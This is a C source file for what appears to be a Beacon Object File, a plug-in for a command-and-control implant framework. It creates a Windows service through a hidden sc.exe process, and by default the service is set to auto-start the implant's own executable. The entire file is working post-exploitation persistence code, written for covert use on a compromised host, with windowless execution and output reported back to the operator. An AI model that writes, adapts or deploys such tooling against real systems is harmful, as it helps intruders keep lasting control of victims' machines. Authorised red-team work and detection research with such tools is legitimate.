/*
 * svc_create_sc.c — Create a Windows service via sc.exe command.
 *
 * Args: "<service_name>" or "<service_name> <exe_path>"
 *   If exe_path is omitted, defaults to the current process executable path.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c svc_create_sc.c -o svc_create_sc.o
 */

#include <windows.h>
#include "beacon.h"

/* ---- BOF API Imports ---- */
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);

/* ---- No-CRT helpers ---- */
static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}
static int uitoa(char* buf, unsigned long v) {
    if (v == 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int ti = 0;
    while (v) { tmp[ti++] = '0' + (v % 10); v /= 10; }
    for (int i = 0; i < ti; i++) buf[i] = tmp[ti - 1 - i];
    return ti;
}

void go(char* args, int alen)
{
    char* input = NULL;
    int input_len = 0;

    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }
    if (!input || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "Usage: <service_name> [exe_path]\n", 33);
        return;
    }

    /* Split args: service_name [exe_path] */
    char raw[512];
    bof_memset(raw, 0, sizeof(raw));
    int clen = input_len < 511 ? input_len : 511;
    bof_memcpy(raw, input, clen);
    raw[clen] = '\0';

    char* svc_name = raw;
    char* exe_path = NULL;

    for (int i = 0; i < clen; i++) {
        if (raw[i] == ' ') {
            raw[i] = '\0';
            exe_path = raw + i + 1;
            break;
        }
    }

    /* Default to current exe if no path given */
    char self_path[512];
    if (!exe_path || bof_strlen(exe_path) == 0) {
        DWORD plen = KERNEL32$GetModuleFileNameA(NULL, self_path, sizeof(self_path));
        if (plen == 0 || plen >= sizeof(self_path)) {
            BeaconOutput(CALLBACK_ERROR, "[SvcSC] GetModuleFileName failed\n", 33);
            return;
        }
        self_path[plen] = '\0';
        exe_path = self_path;
    }

    /* Build: sc create <name> binPath= "<path>" start= auto type= own */
    char cmd[1024];
    int cp = 0;
    cp = sa(cmd, cp, "sc create ");
    cp = sa(cmd, cp, svc_name);
    cp = sa(cmd, cp, " binPath= \"");
    cp = sa(cmd, cp, exe_path);
    cp = sa(cmd, cp, "\" start= auto type= own");
    cmd[cp] = '\0';

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    bof_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    bof_memset(&pi, 0, sizeof(pi));

    BOOL ok = KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) {
        BeaconOutput(CALLBACK_ERROR, "[SvcSC] CreateProcess failed\n", 29);
        return;
    }

    KERNEL32$WaitForSingleObject(pi.hProcess, 15000);
    DWORD exitCode = 1;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exitCode);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    char out[768]; int op = 0;
    if (exitCode == 0) {
        op = sa(out, op, "[SvcSC] Service created successfully\n");
        op = sa(out, op, "  Name  : "); op = sa(out, op, svc_name); out[op++] = '\n';
        op = sa(out, op, "  Path  : "); op = sa(out, op, exe_path); out[op++] = '\n';
        op = sa(out, op, "  Start : auto\n");
        op = sa(out, op, "  Method: sc.exe\n");
        BeaconOutput(CALLBACK_OUTPUT, out, op);
    } else {
        op = sa(out, op, "[SvcSC] sc.exe failed (exit code ");
        op += uitoa(out + op, exitCode);
        op = sa(out, op, ")\n  Cmd: ");
        op = sa(out, op, cmd);
        out[op++] = '\n';
        BeaconOutput(CALLBACK_ERROR, out, op);
    }
}
